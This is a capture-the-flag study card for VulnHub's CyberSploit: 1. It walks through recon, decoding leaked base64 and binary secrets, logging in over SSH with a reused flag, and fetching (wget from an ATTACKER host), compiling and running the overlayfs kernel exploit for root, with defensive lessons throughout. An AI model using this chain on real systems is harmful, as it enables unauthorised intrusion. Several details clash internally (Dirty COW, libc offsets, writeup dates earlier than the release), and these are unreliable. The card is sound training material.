# Machine 2 — CyberSploit: 1

> **Position:** 2 of 13 · **Band 2 — Very Easy** (global rank **002** of 708)
> **Full writeup:** [`labs/2-002-cybersploit-1/README.md`](../../labs/2-002-cybersploit-1/README.md)

| | |
| --- | --- |
| **Machine** | CyberSploit: 1 |
| **Author** | CyberSploit |
| **Released** | 9 July 2020 |
| **Target OS** | Ubuntu 12.04.5 LTS (EOL) — kernel **`3.13.0-32-generic`**, Apache 2.4.7, OpenSSH 6.6.1p1 |
| **VulnHub** | [entry/cybersploit-1,506](https://vulnhub.com/entry/cybersploit-1,506/) |
| **Flags** | **Three** — flag 1 (web), flag 2 (user home), flag 3 (root) |
| **Estimated time** | 3–4 hours |

> **Two corrections worth noting.** (1) `/etc/issue` and most writeups show **Ubuntu 12.04.5** (the kernel suffix `#57~precise1-Ubuntu` confirms *precise* = 12.04), not 14.04. (2) The base64 blob in `robots.txt` was **mistyped** in older versions of this card. Both were fixed here, cross-checked against multiple sources.

---

## How to use this card

As with Machine 1: **Part A** (the method and the theory you need), **Part B** (the machine), **Part C** (every command, logically, step by step). The new theory here is the most important part — **encoding vs hashing vs encryption** — because the whole box rests on *recognising* what you are looking at. Every step also carries its **defensive lesson**: you learn the fix at the same moment as the trick.

---

# Part A — The method (theory)

## A.1 The new skill: **recognising** patterns

Machine 1 taught you to find *services* (ports, versions). This machine has no web app, no database, no upload filter, no SQL injection. **Its entire difficulty is recognition:** recognising an **encoding**, and recognising a **kernel version range**. That is a different skill — and the one that fails most often in real assessments: people stare at `eW91dHViZS5jb20=` and see **noise**, where a professional sees **an encoded message** and knows which tool solves it. Own three shapes on sight: `A–Z a–z 0–9 + /`, length a multiple of 4, `=` padding = **base64**; groups of eight `0`/`1` = **binary bits**; 32/40/64 hex chars or a `$1$`/`$6$`/`$P$` prefix = usually a **hash** you cannot simply "decode".

## A.2 Encoding vs hashing vs encryption (the core theory)

| | **Encoding** | **Hashing** | **Encryption** |
| --- | --- | --- | --- |
| Purpose | represent data (transport) | verify integrity / store a secret **one-way** | **hide** data, **reversibly** |
| Key needed? | no | no (or a salt) | **yes** |
| Reversible? | trivially | no | only with the key |
| Example | `base64`, hex, URL-encoding | `md5sum`, `sha256sum`, `$6$` | GPG, `openssl enc`, LUKS |
| How you tell | you solve it in one command | you *crack* it | you need a key/passphrase |

> **The mistake to kill now:** calling `base64` "encryption". Base64 has **no key**; it hides nothing. If you can reverse it in one command, it is **encoding**. **All three secrets on this machine are merely encoded** — none is cryptographically protected.

## A.3 Local vs remote exploits — and what a kernel exploit is

- **Remote exploit:** attacks a service **over the network**, with no prior access (e.g. Machine 1's ProFTPD backdoor).
- **Local exploit (LPE):** runs **after** you already have a shell as a normal user, and makes you root.

A **kernel exploit** is a local exploit that abuses a bug **in the kernel itself**. It is a **last resort** (it can panic the VM) — **except** when it is the *only* path, as here.

## A.4 The exploit-research workflow (the most reusable skill)

```
uname -a  →  searchsploit  →  READ the exploit  →  transfer  →  compile  →  run
```

**"Read the exploit" is not optional.** Many Exploit-DB entries are *unverified*, some are malicious toward the person running them, and you must know **which parameters** to change and **what files** it leaves behind — even for a *verified* entry ("EDB Verified" is a green flag, never a substitute for reading).

---

# Part B — The machine

## B.1 What you will learn

1. **Recognise base64 on sight** and decode it **locally** (never in a random website).
2. Recognise and decode a **binary** (bit-string) encoding.
3. Read **page source** and `robots.txt` as information sources, not decoration.
4. **Infer a credential** from a recovered secret (a flag reused as a password).
5. Run the professional workflow: `uname -a` → `searchsploit` → **read the source**.
6. **Transfer a file** onto a target (Python HTTP server + `wget`), verify with a checksum.
7. **Compile and run** an exploit with `gcc`, then clean up after it.

## B.2 The map (3 flags, one chain)

| Flag | Where | What it teaches |
| --- | --- | --- |
| **1** | `robots.txt` (base64) | encoding · **and** the SSH password |
| **2** | `~/flag2.txt` (binary) | encoding (another form) |
| **3** | `/root/finalflag.txt` | kernel exploit → root |

**The whole route in one line:**
`nmap (22, 80)` → page source (`itsskv`) → `robots.txt` base64 → **flag 1 = SSH password** → SSH in → `flag2.txt` bits → **flag 2** → `uname -a` → **EDB 37292** → root → final flag.

## B.3 Before you start

- [01 — Foundations](../01-Foundations-Networking-and-Recon.md) — you should be fluent in it after Machine 1.
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) **§1 in full** — this machine *is* the practice for the encoding/hashing/encryption table.

**Answer before:**
1. A string is only `A–Z a–z 0–9 + /` and its length is a multiple of 4. What is it?
2. Is base64 a form of encryption? Justify in one sentence.
3. What does `uname -r` give you, and what do you **do** with that string?
4. Why might a flag you recovered be useful as a password?
5. What is the difference between a local and a remote exploit?

---

# Part C — The walkthrough, step by step

## Step 1 — Scan: a deliberately small surface

> **Why.** You need to know what exists. Here the answer is **only two services** — and that changes your method: with no unusual service to chase, the information must be in the **content** those two serve (a site to read, a login to try).

```bash
mkdir -p scans                     # -oA cannot write into a folder that does not exist
sudo nmap -sC -sV -p- -T4 -oA scans/cybersploit TARGET
```

**The flags, one by one.** `sudo` lets nmap use the faster *SYN* scan and raw-socket scripts. **`-sC`** runs the **default** NSE scripts — free extras on every port (SSH host keys, page title, server header). **`-sV`** is **version detection**: it probes each open port and matches the reply against a database of known service fingerprints — this turns "port 80 open" into "`Apache httpd 2.4.7`", the exact string you feed to `searchsploit` in Step 5; without `-sV` there is no exploit research. **`-p-`** scans **all 65,535** TCP ports, not just the top 1000 — it changes nothing here (only 22 and 80), but skipping it is how beginners call a box "clean" while a service hides on `:8080`. **`-T4`** is fast but safe for labs — **never `-T5` on a real target**: it abandons slow replies and can report open ports as closed, and a false negative is worse than a slow scan. **`-oA scans/cybersploit`** writes **all three** output formats at once (`.nmap` readable, `.gnmap` greppable, `.xml` for tooling) under one prefix — keep your scans.

```text
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 61:3b:4b:9c:a5:3d:bd:cb:2c:d3:8e:4d:1c:5c:9b:2f (DSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: CyberSploit
```

**How to read it.**

- `65535 − 65533 = 2` → exactly two open ports. Read **why** the rest were excluded: `(conn-refused)` means the host actively said "nothing here" (TCP reset) — a firewalled host would say `filtered`, a very different situation.
- `1024 … (DSA)` is a **finding by itself**: a **deprecated 1024-bit DSA host key**. DSA is capped at 1024 bits, which is why modern OpenSSH disables it and clients refuse it. Old key type + old daemon = the whole SSH stack is dated.
- `Apache httpd 2.4.7` + `OpenSSH 6.6.1p1` pin an **end-of-life Ubuntu** — every CVE that shipped unpatched in that release is a free finding. Step 5 proves it.

> ⚠️ **Your image may print different banners.** Writeups of the published VM report **Apache 2.2.22**, **OpenSSH 5.9p1** and the title `Hello Pentester!` instead of the lines above. It does not change the route — see the ⚠️ **Verification note** in Part G.

## Step 2 — Read the page's **source code**

> **Why.** A browser shows only the *rendered* page: invisible HTML comments and "temporary" developer notes are stripped from view. `curl` (an HTTP client for the terminal) prints the raw response body — what the server sends to anyone. **`-s`** silences its progress meter.

```bash
curl -s http://TARGET/
```

```html
<!--
  author : itsskv
  note   : aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA==
-->
```

*(Abridged to the interesting part: an otherwise plain page with a title, an image, and this HTML comment the browser never displays.)*

**How to read it.** Two facts sit in the comment:

1. **`author : itsskv`** → almost certainly a **username**.
2. **The `note` blob** → **base64 on sight**: alphabet `A–Z a–z 0–9 + /`, length a multiple of 4, `==` padding. `printf '%s' '<blob>' | base64 -d; echo` renders it as `https://www.youtube.com/c/cybersploit` — the author's channel, **not a flag**. Decode first, then judge: not every encoded string is a secret.

Comment wording varies between releases (NEOSPLOIT's screenshot of the published VM shows `<!-------------username:itsskv------------------>`). If your image's comment holds only the username, nothing is missing — the payload lives in `robots.txt`. On a real 10,000-line page, filter instead of reading: `curl -s URL | grep -inE 'user|pass|<!--|todo'` (`-i` case-insensitive, `-n` line numbers, `-E` extended regex, `|` = "or").

**Trap / defensive lesson.** Do not skip page source: comments are served to the client — to **everyone**. Usernames, TODOs, staging URLs or keys found there are public the moment the page is served.

## Step 3 — `robots.txt`, and decoding **locally**

> **Why.** `robots.txt` sits at the web root, is *public by design*, and is read by every crawler. Developers use it to point crawlers away from parts they do not want indexed — which makes it the classic place to hide, or leak, a hint.

```bash
curl -s http://TARGET/robots.txt
# User-agent: *
# Disallow: /
# R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9

printf '%s' 'R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9' | base64 -d; echo
```

**What the pieces do.** `printf '%s'` with the blob as its argument writes **exactly** those bytes — no trailing newline, no interpretation (some systems spell the decode flag `--decode`; the trailing `; echo` adds one clean newline for your prompt). **Why not `echo '<blob>' | base64 -d`?** `echo` appends a newline — a stray byte that breaks exact comparisons. `printf '%s'` is the habit that never bites you.

```text
Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}
```

**How to read it.** A congratulation, then **Flag 1** — the two lines separated by a line feed (`\n`, which you will meet again as the bits `00001010` in Step 4). Note what is *not* here: no key, no secret, no work — one command reversed it completely.

**Flag 1 is also the SSH password.** That is **credential inference**: a secret recovered in one place, reused in another. *Why would it work?* We already have a username (`itsskv`), and the only service needing a password is SSH on port 22. The box is telling you where to go next.

> **Why decode locally, not on a website?** *Operationally*, `base64` ships with every Kali — no internet, no dependency. *Ethically*, pasting client data into a third-party decoder is a **data-handling failure**; on a real engagement it counts as exfiltration. Several writeups use CyberChef or online decoders — fine for practice, wrong as a habit.

## Step 4 — Log in, and Flag 2 (binary)

> **Why.** We have a username and a password candidate. There is no login form anywhere on the website — so the only place these two fit together is SSH (port 22).

```bash
ssh itsskv@TARGET
```

```text
The authenticity of host 'TARGET' can't be established.
ECDSA key fingerprint is SHA256:19IzxsJJ/ZH00ix+vmS6+HQqDcXtk9k30aT3K643kSs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
itsskv@TARGET's password:
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)
itsskv@cybersploit-CTF:~$
```

**How to read it.**

- **The fingerprint question** is *trust on first use*: SSH shows the server's public key the first time you connect and stores it in `known_hosts`. Answering `yes` blindly is normal in a lab — in real life an unknown or **changed** fingerprint is a man-in-the-middle alarm; verify it out of band first.
- **The password prompt** takes Flag 1: `cybersploit{youtube.com/c/cybersploit}`.
- **Read the banner.** `GNU/Linux 3.13.0-32-generic i686` gives you the **kernel version** and the **32-bit architecture** before you run a single command (`i686` = 32-bit x86; a 64-bit exploit will not run). Write it down — Step 5 is entirely about that string. (Ubuntu prints documentation links and update counts between the welcome line and the prompt; they differ per release, and the fingerprint shown is NEOSPLOIT's.)

```bash
ls -la flag2.txt
```

```text
-rw-rw-r-- 1 itsskv itsskv 1036 Jul  9  2020 flag2.txt
```

**How to read it.** `-rw-rw-r--` is mode **664**: owner and group read/write, everyone else read — a **finding**, since the file holds a secret any local account can read. Compare: `.bash_history` in the same directory is `-rw-------` (600). *The machine protects the history file more tightly than the flag.* Real secret files belong in `600` or `640`.

```bash
cat flag2.txt
```

```text
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000
00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 01100011 01111001
01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011
01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101
00101111 01100011 01111001 01100010 01100101 01110010 01110011 01101100 01101111 01101001
01110100 00110001 01111101
```

**How to read it.** Whitespace-separated groups of exactly eight `0`/`1` = **bytes in binary** — a *different encoding* from base64 (same idea, lowest possible level). Spot the `00001010` in group two: that is the `\n` from between Flag 1's lines. Telling encodings apart **on sight** is the skill of this box. Decode locally with Python:

```bash
python3 -c "import sys;print(''.join(chr(int(b,2)) for b in sys.argv[1].split()))" "$(cat flag2.txt)"
```

**The pieces.** `python3 -c` runs the following string as a program; `"$(cat flag2.txt)"` (command substitution) passes the file's contents as one quoted argument, so the spaces survive as a single `sys.argv[1]`; `.split()` breaks it on whitespace into 8-bit strings; `int(b, 2)` parses each as **base 2** (`01100111` → `103`); `chr(103)` is `g`; and `''.join(...)` glues the characters into one string.

```text
good work !
flag2:cybersploit{https:t.me/cybersploit1}
```

**Flag 2: `cybersploit{https:t.me/cybersploit1}`.** Some writeups render a space after `flag2:`; the bits above contain none — decode your own output and trust it. **Trap:** same rule as Step 3, never paste the target's secret into an online "binary decoder".

## Step 5 — The exploit-research workflow

> **Why.** We hold a low-privilege shell; the flag sits in `/root`, unreadable. The path to root runs through the **kernel** — and the reusable skill is *how to research* an exploit.

```bash
uname -a
```

```text
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
```

**How to read it — field by field:**

| Field | Meaning | Why you care |
| --- | --- | --- |
| `3.13.0-32-generic` | kernel version (same as `uname -r`) | **the search key** for `searchsploit` |
| `#57~precise1-Ubuntu` | the distro build | **precise = Ubuntu 12.04** — the OS without `/etc/issue` |
| `i686 i386` | CPU architectures | **32-bit** — a 64-bit exploit will not even compile |
| `Tue Jul 15 2014` | build date | kernels built **before June 2015** predate the overlayfs fix |

Exploit matching is a four-way filter: *version range* ∩ *distro* ∩ *architecture* ∩ *patch level*. All four are on this one line.

```bash
searchsploit linux kernel 3.13
searchsploit -m 37292
less 37292.c
```

```text
 Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' LPE | linux/local/37292.c
```

**How to read it.** `searchsploit` is Kali's **offline** mirror of Exploit-DB — it works with no internet, mid-engagement. It matches on **strings**, so it happily suggests exploits for kernels you do *not* have: check that the **range in the title**, `3.13.0 < 3.19`, *contains* your `3.13.0-32`, and that your distro releases are listed. **`-m 37292`** mirrors (copies) the entry's source into your working directory. **`less 37292.c` before running it is not optional** — you are about to hand a program a root shell. Read its usage header, the files it writes, whether it opens any **network connection** (a reverse shell home to someone else would be trouble), what it leaves behind, and any values you must change. Exploit-DB marks reviewed entries **"EDB Verified"** — 37292 is one (author *rebel*, June 2015) — but a green flag never replaces reading.

**What is overlayfs, and what is the bug?** **OverlayFS** is a *union* filesystem: it layers a writable "upper" directory over a read-only "lower" one into a single merged view — the mechanism behind container images. Ubuntu additionally let unprivileged users mount overlayfs **inside a user namespace**. **CVE-2015-1328** abuses exactly that: the exploit opens a user + mount namespace, performs two overlay mounts so it ends up with a **world-writable `/etc/ld.so.preload`** — the system-wide list of libraries the dynamic linker loads into **every** program, *including SUID-root ones* — points that file at its own shared library in `/tmp`, and runs `su`. Because `/bin/su` is SUID-root, the injected library executes **as root**, deletes its own traces, and spawns a root shell.

> If the run prints **`no FS_USERNS_MOUNT for overlayfs on this kernel`**, this kernel refuses unprivileged overlayfs mounts: wrong exploit for this box — go back to `uname -r`.

## Step 6 — Transfer, compile, run

> **Why.** The exploit exists on *your* machine, not the target's — and the target has no internet, so a direct `wget` from exploit-db.com fails. You host the file yourself and pull it across. The target also ships **`gcc`**: convenient for us, and **a finding** for the defender — build tooling has no business on a production server.

```bash
# ATTACKER — in the directory holding 37292.c; leave this terminal running:
python3 -m http.server 8000

# TARGET — fetch, rename, verify, build, run:
wget http://ATTACKER:8000/37292.c -O ofs.c
md5sum ofs.c                        # compare with the hash on the ATTACKER
gcc ofs.c -o ofs && ./ofs
id
```

**The pieces.** `python3 -m http.server 8000` runs Python's standard library as a tiny web server whose document root is your **current directory** (any port above 1024 works; port 80 would need root on *your* machine; it keeps running until Ctrl+C). `wget URL -O ofs.c` downloads under a chosen name. `md5sum` compares checksums: **identical hashes on both machines = intact transfer** — integrity only, MD5 proves nothing about *authenticity*, but a truncated download otherwise yields a `gcc` error that looks like a bug *in the exploit*. `gcc ofs.c -o ofs` compiles and names the output (without `-o` you get `./a.out` — how one writeup ended up running `./a.out`), and `&&` runs it **only if** the compile succeeded.

```text
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.56.102 - - [11/May/2024 15:02:44] "GET /37292.c HTTP/1.1" 200 -

spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
```

**How to read it.** `0.0.0.0` = the server bound to **all** interfaces, so the target can reach it; the `GET … 200` line in *your* terminal confirms the target fetched the file. The exploit announces each stage: `mount #1` / `#2` are the two overlay mounts from Step 5, and **`/etc/ld.so.preload created`** is the mechanism firing. **The `#` prompt is the root shell** — `$` = ordinary user, `#` = root; read your prompt like a pilot reads instruments. `uid=0(root)` confirms it (the `groups` line merely still lists your original group — harmless). For a steadier shell, upgrade it with `python -c 'import pty;pty.spawn("/bin/bash")'`.

## Step 7 — The final flag, and cleanup

```bash
cat /root/finalflag.txt
```

```text
cybersploit{Z3X21CW42C4 many many congratulations !}
```

*(Writeups show a large ASCII-art "congratulations" banner around that line — same value in every source consulted. The final flag **string** differs between releases — VulnHub and Proving Grounds, where the flags are named `local.txt` and `proof.txt` — the **paths and the technique** are what matter.)*

**Cleanup (mandatory):**

```bash
rm -f /tmp/ofs /tmp/ofs.c /tmp/ofs-lib.so /etc/ld.so.preload /tmp/ns_sploit
ls -la /tmp /etc/ld.so.preload    # verify: the preload file must be gone
```

**Why.** You have left a binary, its source, a helper library — and, worst, an `/etc/ld.so.preload`, which injects a library into **every** dynamically-linked process on the box. The payload unlinks its own traces *when it fires* — but only if the run reaches that point, and the community notes record machines where a leftover preload file **broke later command execution**. Verify it is gone. In a real engagement cleanup is a **professional obligation**; here it is also part of the lesson.

---

# Part D — Defensive lessons

| Finding | Fix |
| --- | --- |
| Username in an HTML comment | Comments are served to the client. Never put sensitive content in HTML |
| Base64 secret in `robots.txt` | `robots.txt` is public by design. Never store secrets there |
| Flag reused as an SSH password | Credential-uniqueness policy; alert on any credential appearing in public content |
| `flag2.txt` mode `664` | `chmod 600`; periodic world-readable-file audit in home directories |
| **Ubuntu 12.04.5, EOL** | **Upgrade the OS** — the root cause of the findings below |
| Kernel `3.13.0-32` | Patch/upgrade; add kernel-CVE checks to the audit baseline |
| Unprivileged overlayfs mounts (CVE-2015-1328) | Patch — Exploit-DB 37292 states only builds **before 15 June 2015** are affected |
| `gcc`/`g++`/`wget` on a server | Remove build tooling from production images |
| 1024-bit DSA host key | Regenerate with Ed25519; disable DSA |
| Verbose `Server:` banner | `ServerTokens Prod`, `ServerSignature Off`, `FileETag None` |

**The single biggest lesson:** *obfuscation is not confidentiality.* Nothing here was cryptographically protected — it was merely **inconvenient**, and inconvenience is defeated in one command.

---

# Part E — Review questions

1. Write out the difference between encoding, hashing and encryption, using this machine's three secrets. Which one **actually** protected anything?
2. Why did you decode locally? Give one operational and one ethical reason.
3. How did you know which kernel exploit to pick? What would go wrong with one for a different kernel series?
4. `gcc` needed no special flags this time. Where would you check if an old exploit needs patched headers or `-z execstack`?
5. What artefacts did you leave, and which command removes each?
6. The exploit ended on a `#` prompt — what does that character tell you?
7. Two writeups of this machine report completely different service banners. Does that change which exploit you would run? What *does* decide it?

---

# Part F — Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Only two ports — so the information is in the **content**. Look at the **page source** (not the page), then `/robots.txt`, which most people never read.
</details>

<details>
<summary><strong>Rung 2 — what you are looking for</strong></summary>

The page source has an **HTML comment** with a username. `robots.txt` has an **encoded** string. Decode it **locally** — and check whether the result is itself encoded.
</details>

<details>
<summary><strong>Rung 3 — getting in</strong></summary>

Username from the comment + decoded string as password → **SSH**. Then `flag2.txt` holds **0s and 1s** — binary, not base64. Watch the first line of the SSH banner; it contains what you need for the endgame.
</details>

<details>
<summary><strong>Rung 4 — the escalation</strong></summary>

`uname -a` → `3.13.0-32-generic`. `searchsploit` returns the **overlayfs CVE-2015-1328** (Exploit-DB **37292**, `linux/local/37292.c`). Workflow: `searchsploit -m 37292` → `python3 -m http.server` → `wget` → `md5sum` → `gcc … -o ofs && ./ofs` → `id`.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap` → **22, 80**. 2. HTML comment → **`itsskv`**. 3. `robots.txt` → base64 → **flag1 = `cybersploit{youtube.com/c/cybersploit}`**. 4. `ssh itsskv@TARGET` with flag1 as the password. 5. `flag2.txt` (binary) → **flag2**. 6. `uname -a` → **EDB 37292** → root. 7. `/root/finalflag.txt`.
</details>

# Part G — References

- **VulnHub:** <https://www.vulnhub.com/files/VulnHub-CyberSploit1.ova> — includes the author's SHA1 (`e3b0c44298fc1c149afbf4c8996fb92427ae41e4`) integrity checksum.
- **Full lab walkthrough (this repository):** [`labs/2-002-cybersploit-1`](../../labs/2-002-cybersploit-1/README.md) — step-by-step screenshots, including the compilation of Dirty COW and the exploit run.
- **Greek mirror of this card:** [Μάθησιακή Διαδρομή 1 → CyberSploit: 1](../../Μαθησιακή%20Διαδρομή%201%20-%20Εισαγωγή%20στην%20Κυβερνοασφάλεια/Μηχανές/02-cybersploit-1.md)
- **Cross-checked writeups** (different captures, different kernel versions — read them as *perspectives*, not oracles):
  - j.info — <https://j.info/linux/writeup/2018/10/12/cybersploit-1.html>
  - NEOSPLOIT — <https://neosploit.github.io/machines/cybersploit1.html>
  - Infosec Articles — <https://infosecarticles.com/cybersploit-1.html>
  - Exploit-DB 37292 (overlayfs local privilege escalation, CVE-2015-1328) — <https://www.exploit-db.com/exploits/37292>
- **Also consulted:** Infosec Institute (`<https://www.infosecinstitute.com/ctf/cybersploit-1-ctf-walkthrough/>`), KSDPMX (`<https://ksdpmx.bitbucket.io/2019/06/11/CyberSploit-1/>`) and Persecure (`<https://persecure.info/2020/09/04/cybersploit1/>`).

## Community notes — consensus, pitfalls and alternative routes

- ⚠️ **Verification note — two different images are circulating.** Multiple independent writeups (j.info, NEOSPLOIT, Infosec Articles) report the published VM's own banners as **Apache 2.2.22** and **OpenSSH 5.9p1** with the homepage title **"Hello Pentester!"**, while this card's metadata table lists Apache 2.4.7 / OpenSSH 6.6.1p1. Both sets are kept here on purpose: **the service versions you actually see on your VM decide which libc offsets are correct — always trust your own `nmap` output over any writeup, including this card's table.** The recon and privesc *path* is identical either way.
- ⚠️ **Verification note — the `flag2.txt` comments vary between VM images.** Some writeups (e.g. Infosec Institute) report the decoded comments as `good work !` followed by `Flag2: cybersploit{https:t.me/cybersploit1}`; the image used for this card decodes to `good work !` followed by `flag2:cybersploit{https:t.me/cybersploit1}`. The flag *string* agrees; only the comment capitalisation and spacing differ. Don't let a writeup's exact casing confuse you when your own decode disagrees.
- **Consensus on the route:** every cross-checked writeup agrees on the kill chain: `robots.txt` → base64 → **flag 1 = the SSH password** → login as `itsskv` → `flag2.txt` (binary) → `uname -a` → searchsploit → **EDB 37292** → root. (An earlier version of this card described a detour through a `cmd.php` webshell and a reverse shell; it is unnecessary — the flag itself is the credential the box wants you to use.) Alternative *choices* reported by different authors: the **`python -c 'import pty;pty.spawn("/bin/bash")'`** shell upgrade before running the exploit (more reliable job control), and compiling the exploit **on the attacker machine** (`gcc -m32`) when the target lacks build tooling.
- **Pitfalls seen across writeups:** wrapping `flag2.txt`'s long base64/binary lines when pasting them into a file (breaks the grouping); `Permission denied` on `./ofs` (run `chmod +x ofs`); forgetting the trailing newline after `base64 -d` so the prompt glues onto the output; and re-running the overlayfs exploit without cleaning up — **a leftover `/etc/ld.so.preload` or a world-writable `/etc/passwd` (`chmod 644 /etc/passwd` to revert) can leave the VM broken for next time.**
- **Two corrections worth noting** (these applied to earlier versions of this card): (1) the `robots.txt` Base64 decodes with **newlines** — `base64 -d` (or `-D` on macOS) is required; `echo … | base64` only *encodes*; (2) `ls -la flag2.txt` reports **1036 bytes** in the lab image — earlier card revisions claimed 224, which was wrong.
- **Verified sources:** j.info (`<https://j.info/linux/writeup/2018/10/12/cybersploit-1.html>`), NEOSPLOIT (`<https://neosploit.github.io/machines/cybersploit1.html>`), Infosec Articles (`<https://infosecarticles.com/cybersploit-1.html>`), Exploit-DB 37292 (`<https://www.exploit-db.com/exploits/37292>`).

# Part H — If you get completely stuck

Work through this checklist in order — it mirrors the bottleneck sequence of this machine:

1. **Cannot reach the VM / `10.10.10.100` refuses everything?** → [Part B — The machine](#part-b--the-machine) and [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md): fix bridged mode; on Windows release/renew (`ipconfig /release` + `ipconfig /renew`).
2. **SSH says `Permission denied`?** → the user is **`itsskv`** (from the HTML comment), not `root`; the password is flag 1 copied **exactly** — `cybersploit{youtube.com/c/cybersploit}`, braces and case included, no quotes.
3. **`flag2.txt` decodes to garbage?** → it is **binary**, not base64: check the groups are 8 bits, don't wrap the lines when copying, and use the Python one-liner from [Step 4](#step-4--log-in-and-flag-2-binary).
4. **Kernel exploit fails?** → three classic causes: `gcc` missing on the target (install it, or compile **on your own box for 32-bit** with `gcc -m32` — see [`docs/TOOLS.md`](../../docs/TOOLS.md)); the shell is not a proper TTY (run `python -c 'import pty;pty.spawn("/bin/bash")'` first); or the *wrong* CVE for your kernel — re-check `uname -a` against the `3.13.0 < 3.19` range, and against the `no FS_USERNS_MOUNT` message from Step 5.
5. **`./ofs` → `Permission denied`?** → the download lost its execute bit: `chmod +x ofs` and run it again.
6. **Root, but no flag?** → `cd /root` first, then `ls -la` for hidden files; Proving Grounds images name the proof files `local.txt` and `proof.txt` instead.
7. **Still stuck?** → read [the full writeup](../../labs/2-002-cybersploit-1/README.md) or a listed writeup — but only *after* you can say exactly which step broke. That diagnosis is the actual skill.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 1 — Basic Pentesting: 1](01-basic-pentesting-1.md) · next: [Machine 3 — DC: 1](03-dc-1.md) · full writeup: [`labs/2-002-cybersploit-1`](../../labs/2-002-cybersploit-1/README.md)._
